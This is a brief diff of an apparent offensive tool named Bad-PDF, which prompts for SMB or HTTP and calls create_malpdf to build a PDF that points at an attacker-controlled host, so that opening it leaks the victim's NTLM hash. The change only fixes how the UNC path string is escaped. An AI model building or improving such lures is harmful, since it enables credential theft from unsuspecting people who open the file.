@@ -127,7 +127,7 @@ if __name__ == "__main__":
         method = raw_input("How you want to send NTLM hash to Bad-PDF?\n[1] Over SMB:\n\n[2] Over HTTP\n\n Option > ")
 
         if method == '1':
-            create_malpdf(filename, '\\\\' + '\\\\' + host + '\\')
+            create_malpdf(filename, '\\\\' + '\\\\' + host + '\\\\')
 
         elif method == '2':
             create_malpdf(filename, 'http//' + host + '/')
